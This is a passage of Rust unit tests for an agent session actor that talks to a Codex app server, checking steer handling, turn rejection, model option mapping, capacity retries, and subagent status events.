            actor.active_turn = Some("turn-1".into());
            actor
                .handle_command(SessionCommand::Steer {
                    request_id: "steer-ok".into(),
                    text: "redirect".into(),
                    attachments: Vec::new(),
                })
                .await
                .unwrap();
            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed request")
            };
            let request: Value = serde_json::from_str(&request).unwrap();
            let id = request["id"].as_i64().unwrap();
            actor
                .handle_line(&json!({"id": id, "result": {"turnId": "turn-1"}}).to_string())
                .await;
            assert!(
                events.try_recv().is_err(),
                "the turn/steer reply only means the input was enqueued"
            );

            // The turn's own prompt echo arriving late must not be mistaken
            // for the steer.
            actor
                .handle_line(&json!({"method":"item/started","params":{"threadId":"thread-1","item":{
                    "type":"userMessage","id":"u0","content":[{"type":"text","text":"original prompt"}]
                }}}).to_string())
                .await;
            assert!(events.try_recv().is_err());

            for method in ["item/started", "item/completed"] {
                actor
                    .handle_line(&json!({"method":method,"params":{"threadId":"thread-1","item":{
                        "type":"userMessage","id":"u1","content":[{"type":"text","text":"redirect"}]
                    }}}).to_string())
                    .await;
            }
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::SteerAccepted { ref request_id } if request_id == "steer-ok"
            ));
            assert!(
                events.try_recv().is_err(),
                "one echo lifecycle accepts once"
            );

            actor
                .handle_command(SessionCommand::Steer {
                    request_id: "steer-error".into(),
                    text: "do not accept".into(),
                    attachments: Vec::new(),
                })
                .await
                .unwrap();
            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed request")
            };
            let request: Value = serde_json::from_str(&request).unwrap();
            let id = request["id"].as_i64().unwrap();
            actor
                .handle_line(
                    &json!({"id": id, "error": {"code": -32000, "message": "rejected"}})
                        .to_string(),
                )
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::SteerRejected { ref request_id } if request_id == "steer-error"
            ));
            actor
                .handle_line(&json!({"method":"item/completed","params":{"threadId":"thread-1","item":{
                    "type":"userMessage","id":"u2","content":[{"type":"text","text":"do not accept"}]
                }}}).to_string())
                .await;
            assert!(
                events.try_recv().is_err(),
                "RPC errors must not accept a steer, even if matching text is echoed"
            );

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    /// The runtime routes a steer while its own turn flag is still set, but
    /// `turn/completed` can already be on the wire. The actor then has no turn
    /// to steer into and must say which request it dropped, so the runtime can
    /// send the text as a new turn instead of losing it.
    #[test]
    fn steer_after_turn_completed_is_rejected_by_request_id() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.active_turn = Some("turn-1".into());
            actor
                .handle_line(&json!({"method":"turn/completed","params":{"threadId":"thread-1","turn":{"id":"turn-1","status":"completed"}}}).to_string())
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::TurnCompleted { .. }
            ));
            actor
                .handle_command(SessionCommand::Steer {
                    request_id: "steer-late".into(),
                    text: "late".into(),
                    attachments: Vec::new(),
                })
                .await
                .unwrap();
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::SteerRejected { ref request_id } if request_id == "steer-late"
            ));
            assert!(
                actor.lines.try_recv().is_err(),
                "no turn/steer request is written without an active turn"
            );

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    /// A `turn/start` the runtime already accepted but the server rejects gets
    /// a synthesized failed completion: no `turn/started` will ever follow, so
    /// without it the runtime's turn flag (and the sidebar's "Working" state)
    /// would stay set forever.
    #[test]
    fn rejected_turn_start_synthesizes_failed_completion() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor
                .handle_command(SessionCommand::SendTurn {
                    delivery_id: 7,
                    text: "hello".into(),
                    options: None,
                    attachments: Vec::new(),
                })
                .await
                .unwrap();
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::TurnAccepted { delivery_id: 7 }
            ));
            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed turn/start request")
            };
            let request: Value = serde_json::from_str(&request).unwrap();
            let id = request["id"].as_i64().unwrap();
            actor
                .handle_line(
                    &json!({"id": id, "error": {"code": -32000, "message": "model overloaded"}})
                        .to_string(),
                )
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::Error { fatal: false, .. }
            ));
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::TurnCompleted {
                    status: TurnStatus::Failed,
                    ..
                }
            ));

            // A rejection that races an already-started turn must not fail it.
            actor
                .handle_command(SessionCommand::SendTurn {
                    delivery_id: 8,
                    text: "again".into(),
                    options: None,
                    attachments: Vec::new(),
                })
                .await
                .unwrap();
            let _ = events.recv().await.unwrap(); // TurnAccepted
            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed turn/start request")
            };
            let request: Value = serde_json::from_str(&request).unwrap();
            let id = request["id"].as_i64().unwrap();
            actor.active_turn = Some("turn-live".into());
            actor
                .handle_line(
                    &json!({"id": id, "error": {"code": -32000, "message": "late duplicate"}})
                        .to_string(),
                )
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::Error { .. }
            ));
            assert!(
                events.try_recv().is_err(),
                "an active turn must not be failed by a stray turn/start rejection"
            );

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn maps_model_list_entry_to_spec() {
        let spec = map_model(
            &json!({
                "model": "gpt-5-codex",
                "displayName": "gpt-5-codex",
                "isDefault": true,
                "supportedReasoningEfforts": [
                    {"reasoningEffort": "low", "description": "fast"},
                    {"reasoningEffort": "medium"},
                    {"reasoningEffort": "xhigh"}
                ],
                "defaultReasoningEffort": "medium",
                "serviceTiers": [{"id": "flex", "name": "Flex", "description": "cheap"}],
                "defaultServiceTier": "flex"
            }),
            Some(&model_windows::ModelWindows {
                native: 272_000,
                largest: 872_000,
            }),
        )
        .expect("visible model maps");

        assert_eq!(spec.id, "gpt-5-codex");
        assert_eq!(spec.display_name, "GPT-5-Codex");
        assert!(spec.is_default);
        assert_eq!(spec.options.len(), 3);

        match &spec.options[0] {
            OptionDescriptor::Select {
                role: _,
                apply: _,
                recommended: _,
                permissive: _,
                id,
                label,
                options,
                default_value,
            } => {
                assert_eq!(id, "reasoningEffort");
                assert_eq!(label, "Reasoning");
                assert_eq!(default_value.as_deref(), Some("medium"));
                assert_eq!(options[0].label, "Low");
                assert_eq!(options[0].description.as_deref(), Some("fast"));
                assert_eq!(options[2].label, "Extra High");
            }
            other => panic!("expected reasoning Select, got {other:?}"),
        }
        match &spec.options[1] {
            OptionDescriptor::Select {
                id,
                options,
                default_value,
                ..
            } => {
                assert_eq!(id, "serviceTier");
                assert_eq!(default_value.as_deref(), Some("flex"));
                assert_eq!(options[0].value, "default");
                assert_eq!(options[0].label, "Standard");
                assert_eq!(options[1].value, "flex");
                assert_eq!(options[1].label, "Flex");
            }
            other => panic!("expected serviceTier Select, got {other:?}"),
        }
        // Native window first and default; the largest one Codex clamps to last.
        match &spec.options[2] {
            OptionDescriptor::Select {
                id,
                options,
                default_value,
                ..
            } => {
                assert_eq!(id, "contextWindow");
                assert_eq!(default_value.as_deref(), Some("272k"));
                assert_eq!(options[0].value, "272k");
                assert_eq!(options[1].label, "872k");
                assert_eq!(options.len(), 2);
            }
            other => panic!("expected contextWindow Select, got {other:?}"),
        }
        assert_eq!(
            crate::context_window::selected(&spec.options, &[]),
            Some(272_000)
        );
        assert_eq!(crate::context_window::largest(&spec.options), Some(872_000));
    }

    #[test]
    fn hidden_model_is_skipped_and_speed_tiers_adapt() {
        assert!(
            map_model(
                &json!({"model": "secret", "displayName": "secret", "hidden": true}),
                None
            )
            .is_none()
        );

        // No serviceTiers → adapt additionalSpeedTiers (`fast` → `Fast`).
        let spec = map_model(
            &json!({
                "model": "gpt-x",
                "displayName": "gpt-x",
                "supportedReasoningEfforts": [],
                "additionalSpeedTiers": ["fast", "priority"]
            }),
            None,
        )
        .unwrap();
        // Empty reasoning efforts → no reasoning descriptor: serviceTier, then
        // a contextWindow selector without presets (no cached windows).
        assert_eq!(spec.options.len(), 2);
        match &spec.options[0] {
            OptionDescriptor::Select { id, options, .. } => {
                assert_eq!(id, "serviceTier");
                assert_eq!(options[1].value, "fast");
                assert_eq!(options[1].label, "Fast");
                assert_eq!(options[2].value, "priority");
                assert_eq!(options[2].label, "priority");
            }
            other => panic!("expected serviceTier Select, got {other:?}"),
        }
        match &spec.options[1] {
            OptionDescriptor::Select {
                id,
                options,
                default_value,
                ..
            } => {
                assert_eq!(id, "contextWindow");
                assert!(options.is_empty());
                assert_eq!(default_value, &None);
            }
            other => panic!("expected contextWindow Select, got {other:?}"),
        }
    }

    #[test]
    fn turn_input_carries_image_entries() {
        let attachments = vec![Attachment {
            media_type: "image/png".into(),
            data_base64: "AAAA".into(),
            source_path: None,
        }];
        let payload = user_input("what color?", &attachments);
        let input = payload.as_array().unwrap();
        assert_eq!(input.len(), 2);
        assert_eq!(input[0]["type"], "text");
        assert_eq!(input[0]["text"], "what color?");
        assert_eq!(input[1]["type"], "image");
        assert_eq!(input[1]["url"], "data:image/png;base64,AAAA");
    }

    #[test]
    fn skills_list_response_parses_to_provider_commands() {
        let result = json!({
            "data": [
                {
                    "cwd": "/tmp",
                    "skills": [
                        {"name": "browser:control", "description": "drive the browser", "interface": {"displayName": "Browser"}},
                        {"name": "", "description": "dropped"},
                        {"name": "dataviz", "interface": {"shortDescription": "charts"}}
                    ]
                },
                {"cwd": "/tmp", "skills": [{"name": "browser:control", "description": "dup dropped"}]}
            ]
        });
        let commands = parse_codex_skills(&result);
        assert_eq!(commands.len(), 2);
        assert_eq!(commands[0].name, "browser:control");
        assert_eq!(commands[0].kind, ProviderCommandKind::Skill);
        assert_eq!(
            commands[0].description.as_deref(),
            Some("drive the browser")
        );
        // Falls back to interface.shortDescription when `description` is absent.
        assert_eq!(commands[1].name, "dataviz");
        assert_eq!(commands[1].description.as_deref(), Some("charts"));
    }

    /// A codex binary that dies at startup (the npm-packaging failure mode:
    /// a JS loader error on stderr, then exit 1) must surface its exit status
    /// and stderr in the startup error, not just "exited during startup".
    #[cfg(unix)]
    #[test]
    fn startup_failure_reports_exit_status_and_stderr_tail() {
        use std::os::unix::fs::PermissionsExt;
        let nonce = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let dir = std::env::temp_dir().join(format!("agent-codex-crash-{nonce}"));
        std::fs::create_dir_all(&dir).unwrap();
        let bin = dir.join("codex");
        std::fs::write(
            &bin,
            "#!/bin/sh\n\
             echo 'node:internal/modules/cjs/loader:1215' >&2\n\
             echo \"Error: Cannot find module './dist/cli.js'\" >&2\n\
             exit 1\n",
        )
        .unwrap();
        std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();

        // Concurrently-forked test children can hold the freshly written
        // script's fd open, making exec fail with ETXTBSY on Linux — retry
        // until the spawn reaches the script's own failure.
        let mut attempts = 0;
        let message = loop {
            let err = smol::block_on(list_models(
                Some(bin.clone()),
                LaunchEnv {
                    env: Vec::new(),
                    home: None,
                },
            ))
            .unwrap_err();
            let message = err.to_string();
            if message.contains("Text file busy") && attempts < 20 {
                attempts += 1;
                std::thread::sleep(std::time::Duration::from_millis(25));
                continue;
            }
            break message;
        };
        assert!(message.contains("Cannot find module"), "{message}");
        assert!(message.contains("exit status: 1"), "{message}");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn capacity_failure_offers_native_continuation_after_ten_seconds() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            for (attempt, delay) in [Some(10), Some(30), Some(120), Some(300), None]
                .into_iter()
                .enumerate()
            {
                let turn_id = format!("capacity-{attempt}");
                actor
                    .handle_notification("turn/started", &json!({"turn":{"id":turn_id}}))
                    .await;
                let before = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs();
                actor.handle_notification("error", &json!({
                    "turnId": turn_id, "willRetry": false,
                    "error": {"message": "Selected model is capacity. Please try a different model.",
                              "codexErrorInfo": "serverOverloaded"}
                })).await;
                actor.handle_notification("turn/completed", &json!({
                    "turn": {"id": turn_id, "status": "failed",
                    "error": {"message": "Selected model is capacity. Please try a different model.",
                              "codexErrorInfo": "serverOverloaded"}}
                })).await;
                let mut offered = None;
                while let Ok(event) = events.try_recv() {
                    if let AgentEvent::TurnRetry { retry: Some(retry) } = event {
                        offered = Some(retry);
                    }
                }
                let offered = offered.expect("capacity failure must offer a native retry");
                assert_eq!(offered.turn_id, turn_id);
                assert_eq!(offered.retry_at.is_some(), delay.is_some());
                if let Some(delay) = delay {
                    let deadline = offered.retry_at.unwrap();
                    let after = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs();
                    assert!((before + delay..=after + delay).contains(&deadline));
                }
                // Both automatic and manual paths must continue without duplicating input.
                if attempt == 0 {
                    actor.wake().await.unwrap();
                } else {
                    actor
                        .handle_command(SessionCommand::RetryTurn {
                            turn_id: turn_id.clone(),
                        })
                        .await
                        .unwrap();
                }
                let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
                    panic!("missing continuation")
                };
                let request: Value = serde_json::from_str(&request).unwrap();
                assert_eq!(request["method"], "turn/start");
                assert_eq!(request["params"]["threadId"], "thread-1");
                assert_eq!(request["params"]["input"], json!([]));
                // A second client cannot submit the same retry while start is pending.
                actor
                    .handle_command(SessionCommand::RetryTurn { turn_id })
                    .await
                    .unwrap();
                assert!(actor.lines.try_recv().is_err());
                actor.handle_line(&json!({"id":request["id"], "result":{"turn":{"id":format!("capacity-{}",attempt + 1)}}}).to_string()).await;
            }
            actor
                .handle_command(SessionCommand::Interrupt)
                .await
                .unwrap();
            actor
                .handle_notification("turn/started", &json!({"turn":{"id":"capacity-5"}}))
                .await;
            let ChildOutput::Line(interrupt) = actor.lines.recv().await.unwrap() else {
                panic!("missing interrupt")
            };
            assert_eq!(
                serde_json::from_str::<Value>(&interrupt).unwrap()["method"],
                "turn/interrupt"
            );
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn capacity_retry_cancellation_and_non_capacity_failures_do_not_restart() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            for error in ["usageLimitExceeded", "other", "serverOverloaded"] {
                actor
                    .handle_notification("turn/started", &json!({"turn":{"id":error}}))
                    .await;
                actor
                    .handle_notification(
                        "turn/completed",
                        &json!({"turn":{"id":error,"status":"failed",
                    "error":{"message":"capacity","codexErrorInfo":error}}}),
                    )
                    .await;
                let offers = std::iter::from_fn(|| events.try_recv().ok())
                    .filter(|event| matches!(event, AgentEvent::TurnRetry { retry: Some(_) }))
                    .count();
                assert_eq!(offers, usize::from(error == "serverOverloaded"));
            }
            actor
                .handle_command(SessionCommand::Interrupt)
                .await
                .unwrap();
            assert!(matches!(
                events.try_recv(),
                Ok(AgentEvent::TurnRetry { retry: None })
            ));
            actor.wake().await.unwrap();
            actor
                .handle_command(SessionCommand::RetryTurn {
                    turn_id: "serverOverloaded".into(),
                })
                .await
                .unwrap();
            assert!(actor.lines.try_recv().is_err());
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn model_rerouted_notification_maps_served_model_with_reason() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor
                .handle_notification(
                    "model/rerouted",
                    &json!({
                        "from_model": "gpt-5",
                        "toModel": "gpt-5-mini",
                        "reason": "capacity"
                    }),
                )
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ServedModel { model, reason }
                    if model == "gpt-5-mini" && reason.as_deref() == Some("capacity")
            ));
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn turn_diff_notification_maps_to_exact_replacement_snapshot() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.active_turn = Some("turn-9".into());
            actor
                .handle_notification(
                    "turn/diff/updated",
                    &json!({
                        "turnId": "turn-9",
                        "diff": concat!(
                            "diff --git a/src/lib.rs b/src/lib.rs\n",
                            "--- a/src/lib.rs\n",
                            "+++ b/src/lib.rs\n",
                            "@@ -1 +1 @@\n",
                            "-old\n",
                            "+new\n"
                        )
                    }),
                )
                .await;

            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::TurnChangesUpdated {
                    turn_id,
                    completeness: ChangeCompleteness::Exact,
                    changes,
                } if turn_id == "turn-9"
                    && changes.len() == 1
                    && changes[0].path == "src/lib.rs"
                    && changes[0].kind == FileChangeKind::Modify
            ));
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn native_plan_items_stream_as_assistant_text() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor
                .handle_notification(
                    "item/started",
                    &json!({"item": {"type": "plan", "id": "native-plan", "text": ""}}),
                )
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemStarted(ThreadItem {
                    content: ItemContent::AssistantMessage { .. },
                    ..
                })
            ));
            actor
                .handle_notification(
                    "item/plan/delta",
                    &json!({"itemId": "native-plan", "delta": "# Native plan"}),
                )
                .await;
            assert!(
                matches!(events.recv().await.unwrap(), AgentEvent::Delta { kind: DeltaKind::AssistantText, text, .. } if text == "# Native plan")
            );
            actor.handle_notification("item/completed", &json!({"item": {"type": "plan", "id": "native-plan", "text": "# Final native plan"}})).await;
            assert!(
                matches!(events.recv().await.unwrap(), AgentEvent::ItemCompleted(ThreadItem { content: ItemContent::AssistantMessage { text }, .. }) if text == "# Final native plan")
            );
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn plan_notifications_map_to_events() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.active_turn = Some("turn-9".into());

            actor
                .handle_notification(
                    "turn/plan/updated",
                    &json!({
                        "explanation": "  building  ",
                        "plan": [
                            {"step": "explore", "status": "completed"},
                            {"step": "  ", "status": "inProgress"},
                            {"status": "weird"}
                        ]
                    }),
                )
                .await;
            match events.recv().await.unwrap() {
                AgentEvent::PlanUpdated {
                    turn_id,
                    explanation,
                    steps,
                } => {
                    assert_eq!(turn_id.as_deref(), Some("turn-9"));
                    assert_eq!(explanation.as_deref(), Some("building"));
                    assert_eq!(steps[0].status, PlanStepStatus::Completed);
                    assert_eq!(steps[1].step, "step");
                    assert_eq!(steps[1].status, PlanStepStatus::InProgress);
                    assert_eq!(steps[2].step, "step");
                    assert_eq!(steps[2].status, PlanStepStatus::Pending);
                }
                other => panic!("expected PlanUpdated, got {other:?}"),
            }
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn subagent_activity_is_found_in_defensive_notification_envelope() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.items.insert(
                "call_spawn".into(),
                ThreadItem {
                    id: "call_spawn".into(),
                    parent_item_id: None,
                    content: ItemContent::ToolCall {
                        presentation: None,
                        image_reads: Vec::new(),
                        name: "spawn_agent".into(),
                        input: json!({"agent_type":"researcher","description":"Inspect protocol"}),
                        output: None,
                        status: ItemStatus::InProgress,
                    },
                },
            );
            actor
                .handle_notification(
                    "thread/event",
                    &json!({
                        "event": {
                            "type": "event_msg",
                            "payload": {
                                "type": "sub_agent_activity",
                                "event_id": "call_spawn",
                                "occurred_at_ms": 1783944057000_u64,
                                "agent_thread_id": "thread_child",
                                "agent_path": "/root/researcher",
                                "kind": "started"
                            }
                        }
                    }),
                )
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemUpdated(ThreadItem {
                    id,
                    parent_item_id: None,
                    content: ItemContent::Subagent { status: ItemStatus::InProgress, .. }
                }) if id == "call_spawn"
            ));
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemStarted(ThreadItem {
                    id,
                    parent_item_id: Some(parent),
                    content: ItemContent::Subagent { status: ItemStatus::InProgress, .. }
                }) if id == "call_spawn:thread_child" && parent == "call_spawn"
            ));

            actor
                .handle_notification(
                    "item/completed",
                    &json!({"item": {
                        "type":"dynamicToolCall",
                        "id":"call_spawn",
                        "tool":"spawn_agent",
                        "arguments":{},
                        "contentItems":[{"type":"inputText","text":"done"}],
                        "status":"completed"
                    }}),
                )
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemCompleted(ThreadItem { parent_item_id: Some(parent), content: ItemContent::Subagent { status: ItemStatus::Completed, .. }, .. })
                    if parent == "call_spawn"
            ));
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemCompleted(ThreadItem { id, content: ItemContent::Subagent { status: ItemStatus::Completed, .. }, .. })
                    if id == "call_spawn"
            ));
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn subagent_interaction_preserves_completion_until_work_restarts() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            for (index, (kind, expected)) in [
                ("started", ItemStatus::InProgress),
                ("interacted", ItemStatus::InProgress),
                ("completed", ItemStatus::Completed),
                ("interacted", ItemStatus::Completed),
                ("started", ItemStatus::InProgress),
                ("interrupted", ItemStatus::Interrupted),
                ("interacted", ItemStatus::Interrupted),
            ]
            .into_iter()
            .enumerate()
            {
                actor
                    .handle_notification(
                        "item/completed",
                        &json!({"item": {
                            "type": "subAgentActivity", "id": format!("activity-{index}"),
                            "agentThreadId": "child", "agentPath": "/root/researcher",
                            "kind": kind
                        }}),
                    )
                    .await;
                for _ in 0..2 {
                    let event = events.try_recv().unwrap();
                    let (AgentEvent::ItemStarted(item)
                    | AgentEvent::ItemUpdated(item)
                    | AgentEvent::ItemCompleted(item)) = event
                    else {
                        panic!("expected subagent snapshot");
                    };
                    assert!(
                        matches!(item.content, ItemContent::Subagent { status, .. } if status == expected),
                        "{kind} must preserve the child's actual work state: {item:?}"
                    );
                }
                assert!(events.try_recv().is_err());
            }
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn subagent_labels_use_child_metadata_without_changing_lifecycle() {
        smol::block_on(async {
            for (kind, expected_status) in [
                ("started", ItemStatus::InProgress),
                ("completed", ItemStatus::Completed),
                ("interrupted", ItemStatus::Interrupted),
            ] {
                let (mut actor, events) = test_actor();
                actor.model = Some("gpt-6-astra".into());
                actor.effort = Some("low".into());
                let activity = |kind| {
                    json!({"item": {
                        "type": "subAgentActivity", "id": "spawn",
                        "agentThreadId": "child", "agentPath": "/root/header_mouse",
                        "kind": kind
                    }})
                };
                actor
                    .handle_notification("item/started", &activity("started"))
                    .await;
                for _ in 0..2 {
                    let event = events.try_recv().unwrap();
                    assert!(
                        matches!(
                            event,
                            AgentEvent::ItemUpdated(ThreadItem {
                                content: ItemContent::Subagent {
                                    model: None,
                                    effort: None,
                                    ..
                                },
                                ..
                            }) | AgentEvent::ItemStarted(ThreadItem {
                                content: ItemContent::Subagent {
                                    model: None,
                                    effort: None,
                                    ..
                                },
                                ..
                            })
                        ),
                        "unknown child metadata must not borrow the parent's model: {event:?}"
                    );
                }
                let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
                    panic!("expected thread metadata request");
                };
                let request: Value = serde_json::from_str(&request).unwrap();
                assert_eq!(request["method"], "thread/read");
                assert_eq!(
                    request["params"],
                    json!({"threadId": "child", "includeTurns": false})
                );
                if kind != "started" {
                    actor
                        .handle_notification("item/completed", &activity(kind))
                        .await;
                    while events.try_recv().is_ok() {}
                }
                actor
                    .handle_line(
                        &json!({"id": request["id"], "result": {"thread": {
                            "id": "child", "model": "gpt-5.6-sol", "reasoningEffort": "high"
                        }}})
                        .to_string(),
                    )
                    .await;
                for (id, parent) in [("spawn", None), ("spawn:child", Some("spawn"))] {
                    let AgentEvent::ItemUpdated(item) = events.try_recv().unwrap() else {
                        panic!("expected label update");
                    };
                    assert_eq!(item.id, id);
                    assert_eq!(item.parent_item_id.as_deref(), parent);
                    assert!(matches!(item.content,
                        ItemContent::Subagent { model: Some(model), effort: Some(effort), status, .. }
                        if model == "gpt-5.6-sol" && effort == "high" && status == expected_status
                    ));
                }
                assert!(events.try_recv().is_err());
                if kind == "started" {
                    actor
                        .handle_notification("item/completed", &activity("completed"))
                        .await;
                    for _ in 0..2 {
                        assert!(
                            matches!(events.try_recv().unwrap(), AgentEvent::ItemCompleted(ThreadItem {
                            content: ItemContent::Subagent { model: Some(model), effort: Some(effort), status: ItemStatus::Completed, .. }, ..
                        }) if model == "gpt-5.6-sol" && effort == "high")
                        );
                    }
                }
                let _ = actor.child.kill();
                let _ = actor.child.wait();
            }
        });
    }

    #[test]
    fn root_thread_activity_is_not_a_subagent() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            let root = actor.thread_id.clone();
            let activity = json!({"item": {
                "type": "subAgentActivity", "id": "act-root",
                "agentThreadId": root, "agentPath": "/root", "kind": "interacted"
            }});
            actor.handle_notification("item/started", &activity).await;
            actor.handle_notification("item/completed", &activity).await;
            assert!(
                events.try_recv().is_err(),
                "root activity must not emit a capsule"
            );
            assert!(actor.subagents.is_empty());
            assert!(actor.subagent_parent_by_thread.is_empty());
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn codex_0150_subagent_activity_uses_v2_fields_and_thread_identity() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.items.insert(
                "call_spawn".into(),
                ThreadItem {
                    id: "call_spawn".into(),
                    parent_item_id: None,
                    content: ItemContent::ToolCall {
                        presentation: None,
                        image_reads: Vec::new(),
                        name: "spawnAgent".into(),
                        input: json!({"prompt":"Inspect protocol", "reasoning_effort":"high"}),
                        output: None,
                        status: ItemStatus::Completed,
                    },
                },
            );
            let started = json!({"item": {
                "type": "subAgentActivity",
                "id": "call_spawn",
                "agentThreadId": "thread_child",
                "agentPath": "/root/researcher",
                "kind": "started"
            }});
            actor.handle_notification("item/started", &started).await;
            // Keep the explicit effort while the child's model is still unknown.
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemUpdated(ThreadItem {
                    id,
                    content: ItemContent::Subagent {
                        status: ItemStatus::InProgress,
                        model: None,
                        effort: Some(effort),
                        ..
                    },
                    ..
                }) if id == "call_spawn" && effort == "high"
            ));

            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemStarted(ThreadItem {
                    id,
                    parent_item_id: Some(parent),
                    content: ItemContent::Subagent {
                        status: ItemStatus::InProgress,
                        ..
                    }
                }) if id == "call_spawn:thread_child" && parent == "call_spawn"
            ));

            // Codex emits the instantaneous activity as item/started +
            // item/completed and may additionally fan out the legacy event.
            actor.handle_notification("item/completed", &started).await;
            actor
                .handle_notification(
                    "thread/event",
                    &json!({"event":{"payload":{
                        "type":"sub_agent_activity",
                        "event_id":"call_spawn",
                        "agent_thread_id":"thread_child",
                        "agent_path":"/root/researcher",
                        "kind":"started"
                    }}}),
                )
                .await;
            assert!(events.try_recv().is_err(), "duplicate activity was emitted");

            // Completion uses a fresh activity id in Codex 0.150. It must close
            // the original thread-backed capsule instead of creating a second
            // synthetic subagent.
            let completed = json!({"item": {
                "type": "subAgentActivity",
                "id": "subagent-completed-turn-child",
                "agentThreadId": "thread_child",
                "agentPath": "/root/researcher",
                "kind": "completed"
            }});
            actor.handle_notification("item/started", &completed).await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemCompleted(ThreadItem {
                    id,
                    parent_item_id: None,
                    content: ItemContent::Subagent {
                        status: ItemStatus::Completed,
                        ..
                    }
                }) if id == "call_spawn"
            ));
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemCompleted(ThreadItem {
                    parent_item_id: Some(parent),
                    content: ItemContent::Subagent {
                        status: ItemStatus::Completed,
                        ..
                    },
                    ..
                }) if parent == "call_spawn"
            ));
            actor
                .handle_notification("item/completed", &completed)
                .await;
            assert!(events.try_recv().is_err(), "completion was emitted twice");

            let interrupted = json!({"item": {
                "type": "subAgentActivity",
                "id": "call_interrupt",
                "agentThreadId": "thread_child",
                "agentPath": "/root/researcher",
                "kind": "interrupted"
            }});
            actor
                .handle_notification("item/started", &interrupted)
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemCompleted(ThreadItem {
                    id,
                    content: ItemContent::Subagent {
                        status: ItemStatus::Interrupted,
                        ..
                    },
                    ..
                }) if id == "call_spawn"
            ));
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemCompleted(ThreadItem {
                    parent_item_id: Some(parent),
                    content: ItemContent::Subagent {
                        status: ItemStatus::Interrupted,
                        ..
                    },
                    ..
                }) if parent == "call_spawn"
            ));

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn codex_0150_collab_tool_items_accept_new_values() {
        for tool in [
            "sendMessage",
            "followupTask",
            "interruptAgent",
            "listAgents",
        ] {
            let item = map_item(&json!({
                "type": "collabAgentToolCall",
                "id": format!("call-{tool}"),
                "tool": tool,
                "status": if tool == "interruptAgent" { "interrupted" } else { "completed" },
                "senderThreadId": "root-thread",
                "receiverThreadIds": ["child-thread"],
                "agentsStates": {}
            }))
            .unwrap();
            assert!(matches!(
                item.content,
                ItemContent::ToolCall { name, status, .. }
                    if name == tool
                        && status == if tool == "interruptAgent" {
                            ItemStatus::Interrupted
                        } else {
                            ItemStatus::Completed
                        }
            ));
        }
    }

    #[test]
    fn service_tier_uses_explicit_selection_only() {
        let selections = vec![OptionSelection {
            id: "fastMode".into(),
            value: json!(true),
        }];
        assert_eq!(codex_service_tier(&selections), None);
        let explicit = vec![OptionSelection {
            id: "serviceTier".into(),
            value: json!("flex"),
        }];
        assert_eq!(codex_service_tier(&explicit).as_deref(), Some("flex"));
    }

    #[test]
